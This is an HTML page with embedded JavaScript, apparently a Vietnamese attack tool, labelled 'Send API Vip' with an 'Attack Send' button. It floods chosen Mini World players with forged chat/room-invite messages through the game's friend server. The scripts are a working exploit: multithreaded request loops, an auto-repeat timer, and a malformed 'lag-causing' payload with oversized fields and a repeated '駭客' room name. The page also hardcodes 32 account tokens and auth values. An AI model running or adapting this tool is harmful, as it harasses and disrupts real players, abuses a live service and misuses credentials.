<!DOCTYPE html>
<html lang="vi" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IsSaiPho | SendRequests Mini World</title>
    <link rel="icon" type="image/png" href="https://i.ibb.co/h0Wqp4G/1753777550134.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <header class="flex items-center justify-center gap-4 py-6">
    <a href="">
        <img src="https://i.ibb.co/h0Wqp4G/1753777550134.png" alt="https://t.me/@nezpoder" class="h-16 w-auto drop-shadow-md dark:brightness-110">
    </a>
    <h1 class="text-2xl font-semibold dark:text-white"></h1>
</header>

    <script>
        // On page load or when changing themes, best to add inline in `head` to avoid FOUC
        if (localStorage.getItem('theme') === 'light' || (!('theme' in localStorage) && !window.matchMedia('(prefers-color-scheme: dark)').matches)) {
            document.documentElement.classList.remove('dark');
        } else {
            document.documentElement.classList.add('dark');
        }
        // tuyết 
        const createSnowflake = () => {
        const snowflake = document.createElement("div");
        snowflake.classList.add("snowflake");
        snowflake.textContent = "❄";
        snowflake.style.left = Math.random() * window.innerWidth + "px";
        snowflake.style.opacity = Math.random();
        snowflake.style.fontSize = 12 + Math.random() * 20 + "px";
        snowflake.style.animationDuration = 5 + Math.random() * 5 + "s";
        document.body.appendChild(snowflake);

        setTimeout(() => {
            snowflake.remove();
        }, 10000);
    };

    setInterval(createSnowflake, 200);
    // click hiệu ứng
    document.addEventListener("click", function(e) {
        for (let i = 0; i < 6; i++) {
            const pixel = document.createElement("div");
            pixel.className = "pixel";
            pixel.style.left = `${e.clientX + (Math.random() * 16 - 8)}px`;
            pixel.style.top = `${e.clientY}px`;
            document.body.appendChild(pixel);
            setTimeout(() => pixel.remove(), 800);
        }
    });
    //time
    function updateClock() {
        const now = new Date();
        const options = {
            weekday: 'short', year: 'numeric', month: 'short',
            day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit',
            hour12: false
        };
        const formatted = now.toLocaleString('vi-VN', options);
        document.getElementById('clock-display').textContent = formatted;
    }

    setInterval(updateClock, 1000);
    updateClock(); // gọi ngay khi tải trang
    </script>
<style>
    body {
        font-family: 'Inter', sans-serif;
    }

    .card {
        background-color: #ffffff;
        border-radius: 1rem;
        position: relative;
        z-index: 0;
        overflow: hidden; /* Quan trọng để không tràn viền */
    }

    .card::before {
        content: "";
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        border: 3px solid transparent;
        border-radius: inherit;
        background: linear-gradient(45deg, red, orange, yellow, green, blue, indigo, violet);
        background-size: 300% 300%;
        animation: rainbowBorderAnim 5s linear infinite;
        mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
        mask-composite: exclude;
        -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
        -webkit-mask-composite: destination-out;
        pointer-events: none;
        z-index: 1;
    }

    .card > * {
        position: relative;
        z-index: 2;
    }

    .dark .card {
        background-color: #161b22;
    }

    #log-output::-webkit-scrollbar,
    textarea::-webkit-scrollbar {
        width: 8px;
    }

    #log-output::-webkit-scrollbar-track,
    textarea::-webkit-scrollbar-track {
        background: #161b22;
    }

    #log-output::-webkit-scrollbar-thumb,
    textarea::-webkit-scrollbar-thumb {
        background-color: #4b5563;
        border-radius: 10px;
        border: 2px solid #161b22;
    }

    .progress-bar-inner {
        transition: width 0.3s ease-in-out;
    }

    details > summary {
        cursor: pointer;
    }

    @keyframes rainbowBorderAnim {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    .snowflake {
        position: fixed;
        top: -10px;
        color: rgb(55, 0, 255);
        font-size: 1em;
        user-select: none;
        pointer-events: none;
        z-index: 9999;
        animation: fall linear infinite;
    }

    @keyframes fall {
        to {
            transform: translateY(100vh);
            opacity: 0;
        }
    }
    .pixel {
        position: fixed;
        width: 8px;
        height: 8px;
        background: #0ff;
        animation: pixel-drop 0.8s ease-out forwards;
        pointer-events: none;
        z-index: 9999;
    }

    @keyframes pixel-drop {
        to {
            transform: translateY(80px);
            opacity: 0;
        }
    }
</style>
</head>
<body class="bg-gradient-to-br from-teal-100 via-sky-100 via-indigo-100 to-purple-100 dark:bg-[#0d1117] text-gray-800 dark:text-gray-300 transition-colors duration-300">
<div id="clock-display" class="fixed top-4 right-4 px-3 py-1 rounded-lg text-sm font-mono shadow-lg bg-white text-black dark:bg-gray-900 dark:text-white z-50"></div>
    <div class="container mx-auto p-4 sm:p-6 lg:p-8">
        <header class="mb-8 text-center">
            <h1 class="text-4xl font-bold text-gray-900 dark:text-white">Send API Vip</h1>
            <p class="text-gray-500 dark:text-gray-400 mt-2">Make & Developer By IsSaiPho</p>
        </header>

        <div class="w-full max-w-5xl mx-auto space-y-6">
            <!-- Main Controls -->
            <div class="card rounded-xl p-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                <div class="md:col-span-2 lg:col-span-4">
                    <label for="target-ids" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">ID Mục Tiêu (mỗi ID một dòng)</label>
                    <textarea id="target-ids" rows="4" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-blue-500" placeholder="Nhập mỗi ID mục tiêu trên một dòng..."></textarea>
                </div>
                <div>
                    <label for="num-loops" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">Số Lần Lặp / Mục tiêu</label>
                    <input type="number" id="num-loops" value="10" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-blue-500">
                </div>
                <div>
                    <label for="num-workers" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">Số Luồng (Workers)</label>
                    <input type="number" id="num-workers" value="10" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-blue-500">
                </div>
                <div class="lg:col-span-2">
                    <label for="request-delay" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">Độ trễ giữa các yêu cầu (ms)</label>
                    <input type="number" id="request-delay" value="0" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg px-3 py-2 focus:ring-2 focus:ring-blue-500">
                </div>
            </div>

            <!-- Auto-run Controls -->
            <div class="card rounded-xl p-6">
                <h3 class="text-lg font-semibold mb-3 text-gray-900 dark:text-white">Tự động chạy lại</h3>
                <div class="flex items-center space-x-4">
                    <div class="flex items-center">
                        <input id="auto-run-checkbox" type="checkbox" class="h-4 w-4 rounded border-gray-300 text-blue-600 focus:ring-blue-500">
                        <label for="auto-run-checkbox" class="ml-2 block text-sm text-gray-900 dark:text-gray-300">Kích hoạt tự động chạy</label>
                    </div>
                    <div class="flex items-center">
                        <label for="auto-run-interval" class="mr-2 text-sm">Sau mỗi</label>
                        <input type="number" id="auto-run-interval" value="120" class="w-24 bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg px-3 py-1 focus:ring-2 focus:ring-blue-500">
                        <span class="ml-2 text-sm">giây</span>
                    </div>
                </div>
                 <p class="text-xs text-gray-500 dark:text-gray-400 mt-2">Lưu ý: Tab này phải được mở để chức năng tự động chạy hoạt động.</p>
            </div>

            <!-- Action Buttons -->
            <div class="flex items-center justify-center space-x-4">
                <button id="start-btn" class="px-8 py-3 bg-yellow-600 text-white font-semibold rounded-lg shadow-md hover:bg-yellow-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-900 focus:ring-yellow-500 transition-transform transform hover:scale-105">Attack Send</button>
                <button id="stop-btn" class="px-8 py-3 bg-red-600 text-white font-semibold rounded-lg shadow-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-offset-gray-900 focus:ring-red-500 transition-transform transform hover:scale-105" disabled>Stop Send</button>
            </div>
            
            <!-- Progress Bar & Stats -->
            <div class="card rounded-xl p-6 space-y-4">
                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
                    <div><p class="text-sm text-gray-500 dark:text-gray-400">𝗥𝗮𝗻𝗸</p><p id="status" class="text-lg font-bold text-yellow-500 dark:text-yellow-400">👑 Admin 👑</p></div>
                    <div><p class="text-sm text-gray-500 dark:text-gray-400">𝗦𝗲𝗻𝗱</p><p id="sent-count" class="text-lg font-bold text-gray-900 dark:text-white">0</p></div>
                    <div><p class="text-sm text-gray-500 dark:text-gray-400">𝗦𝘂𝗰𝗰𝗲𝘀𝘀-𝗰𝗼𝘂𝗻𝘁</p><p id="success-count" class="text-lg font-bold text-green-600 dark:text-green-400">0</p></div>
                    <div><p class="text-sm text-gray-500 dark:text-gray-400">𝗙𝗮𝗶𝗹-𝗰𝗼𝘂𝗻𝘁</p><p id="fail-count" class="text-lg font-bold text-red-600 dark:text-red-400">0</p></div>
                </div>
                <div>
                    <div class="flex justify-between mb-1">
                        <span id="progress-text" class="text-base font-medium text-gray-600 dark:text-gray-300">Tiến trình</span>
                        <span id="progress-percentage" class="text-sm font-medium text-gray-600 dark:text-gray-300">0%</span>
                    </div>
                    <div class="w-full bg-gray-200 dark:bg-gray-700 rounded-full h-2.5">
                        <div id="progress-bar" class="bg-blue-600 h-2.5 rounded-full progress-bar-inner" style="width: 0%"></div>
                    </div>
                </div>
            </div>

            <!-- Log Output -->
            <div class="card rounded-xl p-4">
                <h3 class="text-lg font-semibold mb-2 px-2 text-gray-900 dark:text-white">Status Log</h3>
                <div class="bg-gray-100 dark:bg-gray-900/50 rounded-lg p-4 h-64 overflow-y-auto border border-gray-200 dark:border-gray-700">
                    <pre id="log-output" class="text-sm whitespace-pre-wrap break-all"></pre>
                </div>
            </div>

            <!-- Advanced Settings -->
            <details class="card rounded-xl">
                <summary class="font-semibold text-lg text-gray-900 dark:text-white p-4">Cài đặt Nâng cao (Tài khoản & Payload)</summary>
                <div class="p-4 border-t border-gray-200 dark:border-gray-700 space-y-4">
                    <div>
                        <label for="accounts-json" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">Danh sách tài khoản (JSON)</label>
                        <textarea id="accounts-json" rows="10" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg p-2 text-xs font-mono"></textarea>
                    </div>
                    <div>
                        <label for="payload-json" class="block text-sm font-medium text-gray-600 dark:text-gray-300 mb-1">Payload Gây Lag (JSON)</label>
                        <textarea id="payload-json" rows="8" class="w-full bg-gray-100 dark:bg-gray-900/50 border border-gray-300 dark:border-gray-600 text-gray-900 dark:text-white rounded-lg p-2 text-xs font-mono"></textarea>
                    </div>
                </div>
            </details>
        </div>
    </div>

    <!-- Web Worker Script -->
    <script id="worker-script" type="javascript/worker">
        const utf8ToBase64 = (str) => {
            return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
                (match, p1) => String.fromCharCode('0x' + p1)
            ));
        };

        const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        self.onmessage = async (e) => {
            const { jobs, roomDataPayload, baseMessage, delay } = e.data;
            let sent = 0, success = 0, fail = 0;

            const extend_data = utf8ToBase64(JSON.stringify(roomDataPayload));
            const layer1 = utf8ToBase64(baseMessage);
            const layer2 = utf8ToBase64(layer1);
            const layer3 = utf8ToBase64(layer2);
            
            const encoded_message = encodeURIComponent(layer3);

            for (const job of jobs) {
                if (self.stopped) break; 

                const { account, des_uin } = job;
                const params = new URLSearchParams({
                    apiid: "-999", cmd: "send_chat_msg", country: "VN", des_uin: des_uin,
                    extend_data: extend_data, lang: "10", msg: encoded_message,
                    show_type: "-999999999999", src_uin: account.uin, ver: "1.2",
                    msgtype: "-9999999999999", pushchannel: "-999999999999999",
                    s2t: account.s2t, time: account.time, uin: account.uin,
                    token: account.token, auth: account.auth
                });
                
                const fullUrl = `http://friend.miniworldgame.com:8180/server/friend?${params.toString()}`;
                
                try {
                    await fetch(fullUrl, { mode: 'no-cors' });
                    success++;
                } catch (error) {
                    fail++;
                }
                sent++;

                self.postMessage({ type: 'progress', sent: 1, success: success > 0 ? 1 : 0, fail: fail > 0 ? 1 : 0 });
                
                if (delay > 0) {
                    await sleep(delay);
                }
            }
            self.postMessage({ type: 'done' });
        };
    </script>
    
    <!-- Main Page Script -->
    <script>
        // --- DOM Elements ---
        const targetIdsTextarea = document.getElementById('target-ids');
        const numLoopsInput = document.getElementById('num-loops');
        const numWorkersInput = document.getElementById('num-workers');
        const requestDelayInput = document.getElementById('request-delay');
        const accountsJsonTextarea = document.getElementById('accounts-json');
        const payloadJsonTextarea = document.getElementById('payload-json');
        const startBtn = document.getElementById('start-btn');
        const stopBtn = document.getElementById('stop-btn');
        const statusEl = document.getElementById('status');
        const sentCountEl = document.getElementById('sent-count');
        const successCountEl = document.getElementById('success-count');
        const failCountEl = document.getElementById('fail-count');
        const logOutput = document.getElementById('log-output');
        const progressBar = document.getElementById('progress-bar');
        const progressText = document.getElementById('progress-text');
        const progressPercentage = document.getElementById('progress-percentage');
        const autoRunCheckbox = document.getElementById('auto-run-checkbox');
        const autoRunIntervalInput = document.getElementById('auto-run-interval');
        
        // --- State & Initial Data ---
        let workers = [];
        let totalSent = 0, totalSuccess = 0, totalFail = 0, totalRequests = 0;
        let isSending = false;
        let autoRunIntervalId = null;

        const initialAccountData = [
            {"uin": "1192548629", "s2t": "1750761079", "time": "1750761375", "token": "56e1270a431ba1a3abd4c7b18a7f1bf0", "auth": "aa432f85272d12df19a4a17933f300e6"},
            {"uin": "1309004346", "s2t": "1750761464", "time": "1750761555", "token": "6eeac136b1f49e688ee9e437bb949f0f", "auth": "db7064685c6a70254039711340c03adb"},
            {"uin": "1309476734", "s2t": "1750761603", "time": "1750761675", "token": "8262d1b82e9949aade2dadba213eebcc", "auth": "9fdfd7a88d714fc17fb2e32e33397532"},
            {"uin": "1309476903", "s2t": "1750761704", "time": "1750761793", "token": "a0d4d2212f9ff46c5f4cf2743472219f", "auth": "5888383eedf2a8c4b6af5c849913e8e9"},
            {"uin": "1146608460", "s2t": "1752890706", "time": "1752890797", "token": "9e8babc7ad6bec6f6d57c33fe5e8011b", "auth": "f41fe18debd02072a1d620ec2f90ed1b"},
            {"uin": "1312056657", "s2t": "1752891303", "time": "1752891501", "token": "e9dabd456e146e38bcfc3ced4a569246", "auth": "b3399801ed098900b43f0a566b2cc7c3"},
            {"uin": "1312056847", "s2t": "1752891543", "time": "1752891778", "token": "7eeb7cc93e8977da887117256a911ec4", "auth": "206a5608a8779b6a494768ae738460d2"},
            {"uin": "1312056825", "s2t": "1752891810", "time": "1752891877", "token": "630d2d38d1a2be98dcb694cd30440442", "auth": "c56af74507d6b4f055a04d6df08bb74c"},
            {"uin": "1312056949", "s2t": "1752891909", "time": "1752891956", "token": "fc61fa0aef26216c7f660241a4eeab20", "auth": "a26b1d500872a2a2a4b2357ea1491157"},
            {"uin": "1057698525", "s2t": "1752891995", "time": "1752892056", "token": "81ea64409b2a87dff8f4a5597f050b9f", "auth": "fc5539706533f7e740322f9666a1a13c"},
            {"uin": "1096070776", "s2t": "1752892090", "time": "1752892142", "token": "2152ab331ee36a0b58476c21b8e7053d", "auth": "62e6f5d6ad625e29cb5e7954ccd80478"},
            {"uin": "1312726552", "s2t": "1752894358", "time": "1752894609", "token": "64337a528a8a01a5dac8fb69e50c9ad7", "auth": "cb01a1ed70482d9ea2d7f5689b306e03"},
            {"uin": "1312026983", "s2t": "1752894818", "time": "1752894977", "token": "144a3c17f02cf28721c27ecf96c356e9", "auth": "94763114761c1929f620da0b06eedbc0"},
            {"uin": "1066086948", "s2t": "1752895028", "time": "1752895113", "token": "ead8c3588d89ab0583bc3268e35a7c56", "auth": "7058bc95f8c194dc0b30ecc6cb1843b0"},
            {"uin": "1080547503", "s2t": "1752895142", "time": "1752895208", "token": "35f4b234b83ff2578948198e4097adf1", "auth": "0cfe42f29a9e7bf7dd25ef5af30bc6ba"},
            {"uin": "1058616752", "s2t": "1752895253", "time": "1752895338", "token": "4d1c41967928a4cc7096291dad68f10c", "auth": "6dbf53d2126622c65ea46f2996b5baf6"},
            {"uin": "1080728158", "s2t": "1752895379", "time": "1752895440", "token": "a163708b43868d3a5430921dda0a4de1", "auth": "8a0b7af8faa1fd6e097ef296c586719f"},
            {"uin": "1057173249", "s2t": "1752895635", "time": "1752895635", "token": "fd8b90be97d95f1402ff896a2ead94d5", "auth": "56fcb62657844793364f9f954326117a"},
            {"uin": "1122960293", "s2t": "1752895751", "time": "1752895751", "token": "2c156b8bf87c0af61d846e586e2387c7", "auth": "b8bd84d73659d32f4a221648bb6968a0"},
            {"uin": "1085277564", "s2t": "1752896084", "time": "1752896084", "token": "979d21cbf4564346757fea3078a8b0be", "auth": "b096a1c285e25e67b167fdc8154c77b9"},
            {"uin": "1110729685", "s2t": "1753071093", "time": "1753071184", "token": "9683cbffad3f4888b810ec3afaf6b26e", "auth": "f149760489a42bf685f1d4a165f024ea"},
            {"uin": "1269789381", "s2t": "1753071228", "time": "1753071265", "token": "4a4200ab48c0de47ca0f78ac3434befd", "auth": "bbc8aac4789be37a9b37ab3ebd78ae82"},
            {"uin": "1040178523", "s2t": "1753071311", "time": "1753071431", "token": "4c9d1699ba8935847f6a1bc7282bc4b5", "auth": "5417e0fe676a8ffc9f1ace7f3598281c"},
            {"uin": "1093772683", "s2t": "1753071524", "time": "1753071618", "token": "e593d8fcab3a2d0ab1def80fcba7324c", "auth": "b7b61233a4fcd5b8a763500ad0ab44e2"},
            {"uin": "1080772732", "s2t": "1753071683", "time": "1753071849", "token": "aa50e3c8c3c1b166a092753a35b370f6", "auth": "6c339ed90077433b60e7c850e2e16837"},
            {"uin": "1136959118", "s2t": "1753071895", "time": "1753071964", "token": "90c2cc319ec2451beeee2d330c52c13d", "auth": "5a2647afe85a4c95aadc1ab33d537d3f"},
            {"uin": "1269849978", "s2t": "1753072040", "time": "1753072127", "token": "e4bcf1d731340cc01f9309cc093338bd", "auth": "5ecf5fc0e9e437bf0513e4dc186e524c"},
            {"uin": "1106196843", "s2t": "1753072162", "time": "1753072221", "token": "05b156d5350859d0c5343cc317d75064", "auth": "7a9f7dce81e6a35f8e67bf36737ec88f"},
            {"uin": "1248090796", "s2t": "1753072688", "time": "1753072814", "token": "6c66b3ded2beeeefef5f9486ac66da34", "auth": "3afac4a0de775a8ceda931090729b047"},
            {"uin": "1273280597", "s2t": "1753072921", "time": "1753072978", "token": "0c71e2369f094021c9e00aefe5b6d485", "auth": "c5f870545842368a8f504795a91ff762"},
            {"uin": "1056759534", "s2t": "1753073135", "time": "1753073205", "token": "e0bdb0d303ece9c02af7e2f336a34e6c", "auth": "6fcc88354230a8b327287118a9f11f70"},
            {"uin": "1258939149", "s2t": "1753073286", "time": "1753073409", "token": "c3a4ead09e22ccf6584f29fa2ee0f20f", "auth": "c93b346f3e5b5818df0ae2880c55b543"}
        ];
        const initialPayloadData = {"GuestInCollaborationMode":false,"ErrorCode":true,"InviterName":"IsSaiPho On Top","Password":"迷你世","PlayerMaxNum":999999999999,"PlayerNum":999999999999,"RoomName":"駭客".repeat(920),"RoomNum":999999999999,"RoomType":999999999999,"RoomUin":999999999999,"RoomVer":999999999999,"ServerID":217632137,"ServerIP":12362137,"ServerPort":1236,"Standby1":-99999999,"Type":"InviteJoinRoom","WorldID":-9999999999,"WorldType":61231293,"WorldUin":1146608460,"WorldVer":999999999999,"WorldDesc":2321,"WorldIcon":2321,"WorldType_":2322131,"WorldUin_":1146608460};
        
        // --- Helper Functions ---
        function log(message, colorClass = 'text-gray-500 dark:text-gray-400') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.innerHTML = `<span class="text-cyan-500">[${timestamp}]</span> <span class="${colorClass}">${message}</span>`;
            logOutput.appendChild(logEntry);
            logOutput.scrollTop = logOutput.scrollHeight;
        }

        function updateUIState(sending) {
            isSending = sending;
            startBtn.disabled = sending;
            stopBtn.disabled = !sending;
            
            // Chỉ vô hiệu hóa các input khi đang thực sự gửi, trừ nút stop
            const inputsToDisable = [targetIdsTextarea, numLoopsInput, numWorkersInput, requestDelayInput, accountsJsonTextarea, payloadJsonTextarea, autoRunCheckbox, autoRunIntervalInput];
            inputsToDisable.forEach(input => input.disabled = sending);
        }


        function resetStats() {
            totalSent = 0; totalSuccess = 0; totalFail = 0; totalRequests = 0;
            sentCountEl.textContent = '0';
            successCountEl.textContent = '0';
            failCountEl.textContent = '0';
            progressBar.style.width = '0%';
            progressText.textContent = 'Tiến trình';
            progressPercentage.textContent = '0%';
        }

        function updateProgress() {
            sentCountEl.textContent = totalSent.toLocaleString();
            successCountEl.textContent = totalSuccess.toLocaleString();
            failCountEl.textContent = totalFail.toLocaleString();

            const percentage = totalRequests > 0 ? (totalSent / totalRequests * 100) : 0;
            progressBar.style.width = `${Math.min(percentage, 100)}%`;
            progressText.textContent = `Tiến trình (${totalSent.toLocaleString()}/${totalRequests.toLocaleString()})`;
            progressPercentage.textContent = `${percentage.toFixed(1)}%`;
        }
        
        function stopSending(reason = "Đã dừng bởi người dùng.") {
            if (autoRunIntervalId) {
                clearInterval(autoRunIntervalId);
                autoRunIntervalId = null;
            }
            if (workers.length > 0) {
                workers.forEach(worker => worker.terminate());
                workers = [];
            }
            log(reason, 'text-yellow-500 dark:text-yellow-400');
            statusEl.textContent = 'Đã dừng';
            statusEl.className = 'text-lg font-bold text-red-600 dark:text-red-400';
            updateUIState(false);
        }

        async function startSending() {
            if (isSending) return;

            // --- Validation ---
            const targetIds = targetIdsTextarea.value.split('\n').map(id => id.trim()).filter(id => id !== '' && !isNaN(parseInt(id, 10)));
            if (targetIds.length === 0) {
                log('Lỗi: Vui lòng nhập ít nhất một ID Mục Tiêu hợp lệ.', 'text-red-600 dark:text-red-400');
                if (autoRunCheckbox.checked) stopSending("Lỗi ID, đã dừng tự động chạy.");
                return;
            }

            const numLoops = parseInt(numLoopsInput.value, 10);
            const numWorkers = parseInt(numWorkersInput.value, 10);
            const delay = parseInt(requestDelayInput.value, 10);

            if (isNaN(numLoops) || numLoops <= 0 || isNaN(numWorkers) || numWorkers <= 0 || isNaN(delay) || delay < 0) {
                log('Lỗi: Các giá trị số không hợp lệ.', 'text-red-600 dark:text-red-400');
                if (autoRunCheckbox.checked) stopSending("Lỗi cấu hình, đã dừng tự động chạy.");
                return;
            }

            let accounts, roomDataPayload;
            try {
                accounts = JSON.parse(accountsJsonTextarea.value);
                roomDataPayload = JSON.parse(payloadJsonTextarea.value);
                if (!Array.isArray(accounts) || accounts.length === 0) throw new Error("Dữ liệu tài khoản rỗng hoặc không phải mảng.");
            } catch (e) {
                log(`Lỗi JSON: ${e.message}`, 'text-red-600 dark:text-red-400');
                if (autoRunCheckbox.checked) stopSending("Lỗi JSON, đã dừng tự động chạy.");
                return;
            }

            // --- Initialization ---
            updateUIState(true);
            resetStats();
            log('Bắt đầu chu kỳ mới...', 'text-blue-500');
            
            // Cập nhật trạng thái dựa trên chế độ chạy
            if (autoRunCheckbox.checked) {
                statusEl.textContent = 'Tự động chạy...';
                statusEl.className = 'text-lg font-bold text-cyan-500 dark:text-cyan-400';
            } else {
                statusEl.textContent = 'Đang gửi...';
                statusEl.className = 'text-lg font-bold text-green-600 dark:text-green-400';
            }
            
            // --- Build Request Queue ---
            const requestQueue = [];
            const finalTargetIds = targetIds.map(id => parseInt(id, 10) + 1000000000);

            for (let i = 0; i < numLoops; i++) {
                for (const account of accounts) {
                    for (const finalId of finalTargetIds) {
                        requestQueue.push({ account, des_uin: finalId.toString() });
                    }
                }
            }
            
            totalRequests = requestQueue.length;
            updateProgress();
            log(`Chuẩn bị gửi ${totalRequests.toLocaleString()} yêu cầu đến ${finalTargetIds.length} mục tiêu.`, 'text-blue-600 dark:text-blue-400');

            // --- Create and Distribute Work ---
            const workerScriptBlob = new Blob([document.getElementById('worker-script').textContent], { type: 'application/javascript' });
            const workerScriptUrl = URL.createObjectURL(workerScriptBlob);
            let workersDone = 0;
            
            if (totalRequests === 0) {
                finishCycle();
                return;
            }

            const jobsPerWorker = Math.ceil(totalRequests / numWorkers);

            for (let i = 0; i < numWorkers; i++) {
                const worker = new Worker(workerScriptUrl);
                workers.push(worker);

                worker.onmessage = (e) => {
                    const { type, sent, success, fail } = e.data;
                    if (type === 'progress') {
                        totalSent += sent;
                        totalSuccess += success;
                        totalFail += fail;
                        updateProgress();
                    } else if (type === 'done') {
                        workersDone++;
                        if (workersDone === workers.length) {
                            finishCycle();
                        }
                    }
                };
                
                worker.onerror = (err) => {
                    log(`Lỗi ở Luồng ${i+1}: ${err.message}`, 'text-red-600 dark:text-red-400');
                };

                const jobsForWorker = requestQueue.splice(0, jobsPerWorker);
                if (jobsForWorker.length > 0) {
                    worker.postMessage({
                        jobs: jobsForWorker,
                        roomDataPayload: roomDataPayload,
                        baseMessage: "駭客駭客駭客駭客",
                        delay: delay
                    });
                } else {
                    workersDone++;
                }
            }
             if (workers.length === workersDone) {
                finishCycle();
            }
        }

        function finishCycle() {
            log('=== HOÀN TẤT CHU KỲ ===', 'text-blue-600 dark:text-blue-400 font-bold');
            
            // Clean up workers
            workers.forEach(worker => worker.terminate());
            workers = [];

            // Handle auto-run status and next cycle
            if (autoRunCheckbox.checked && autoRunIntervalId) {
                statusEl.textContent = 'Chờ chu kỳ tiếp...';
                statusEl.className = 'text-lg font-bold text-purple-500 dark:text-purple-400';
                log(`Chu kỳ tiếp theo sẽ bắt đầu sau ${autoRunIntervalInput.value} giây.`, 'text-purple-500');
                isSending = false; // Allow next cycle to start
            } else {
                statusEl.textContent = 'Hoàn tất';
                statusEl.className = 'text-lg font-bold text-yellow-500 dark:text-yellow-400';
                updateUIState(false);
            }
        }

        function handleStartClick() {
            if (isSending) return;

            if (autoRunCheckbox.checked) {
                const intervalSeconds = parseInt(autoRunIntervalInput.value, 10);
                if (isNaN(intervalSeconds) || intervalSeconds <= 0) {
                    log("Lỗi: Khoảng thời gian tự động chạy không hợp lệ.", 'text-red-500');
                    return;
                }
                
                if (autoRunIntervalId) clearInterval(autoRunIntervalId); // Clear any old interval
                
                startSending(); // Run the first cycle immediately
                autoRunIntervalId = setInterval(startSending, intervalSeconds * 1000);
                
                // Update UI for auto-run mode
                updateUIState(true);
                log(`Đã bắt đầu chế độ tự động chạy.`, 'text-green-500');
            } else {
                startSending(); // Just run once
            }
        }
        
        function initialize() {
            accountsJsonTextarea.value = JSON.stringify(initialAccountData, null, 2);
            payloadJsonTextarea.value = JSON.stringify(initialPayloadData, null, 2);
            log('Công cụ sẵn sàng.');

            startBtn.addEventListener('click', handleStartClick);
            stopBtn.addEventListener('click', () => stopSending());
            autoRunCheckbox.addEventListener('change', () => {
                if (!autoRunCheckbox.checked && autoRunIntervalId) {
                    stopSending("Đã tắt tự động chạy.");
                }
            });
        }

        // --- Execution ---
        document.addEventListener('DOMContentLoaded', initialize);
    </script>
   <footer class="mt-10 text-center text-sm text-gray-500 dark:text-gray-400">
    <p class="flex items-center justify-center gap-4">
        <span class="flex items-center gap-1">
            <!-- Discord Icon -->
            <svg class="w-5 h-5 text-blue-500 dark:text-blue-400" fill="currentColor" viewBox="0 0 24 24">
                <path d="M20.317 4.369a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.211.375-.444.864-.608 1.248a18.247 18.247 0 0 0-5.487 0 12.99 12.99 0 0 0-.617-1.248.077.077 0 0 0-.078-.037A19.736 19.736 0 0 0 3.682 4.369a.07.07 0 0 0-.032.027C.533 9.339-.32 14.223.099 19.057a.082.082 0 0 0 .031.056c2.104 1.55 4.13 2.488 6.132 3.103a.076.076 0 0 0 .084-.028c.472-.65.891-1.34 1.244-2.063a.076.076 0 0 0-.041-.103c-.67-.254-1.313-.56-1.936-.911a.076.076 0 0 1-.008-.127c.13-.097.26-.196.386-.297a.075.075 0 0 1 .078-.01c4.055 1.865 8.451 1.865 12.47 0a.075.075 0 0 1 .079.009c.125.101.256.2.387.298a.076.076 0 0 1-.006.127 12.53 12.53 0 0 1-1.937.91.076.076 0 0 0-.04.104c.36.723.78 1.412 1.245 2.063a.076.076 0 0 0 .084.028c2.003-.615 4.028-1.553 6.132-3.102a.076.076 0 0 0 .031-.057c.5-5.177-.838-10.023-3.49-14.661a.061.061 0 0 0-.032-.028zM8.02 15.331c-1.183 0-2.157-1.085-2.157-2.419 0-1.334.955-2.418 2.157-2.418 1.21 0 2.175 1.093 2.157 2.418 0 1.334-.955 2.419-2.157 2.419zm7.974 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.334.955-2.418 2.157-2.418 1.21 0 2.175 1.093 2.157 2.418 0 1.334-.947 2.419-2.157 2.419z" />
            </svg>
            <span class="text-blue-600 dark:text-blue-400">@vesento_script</span>
        </span>
        <span class="flex items-center gap-1">
            <!-- Telegram Icon CHUẨN -->
            <svg class="w-5 h-5 text-blue-400 dark:text-blue-300" fill="currentColor" viewBox="0 0 24 24">
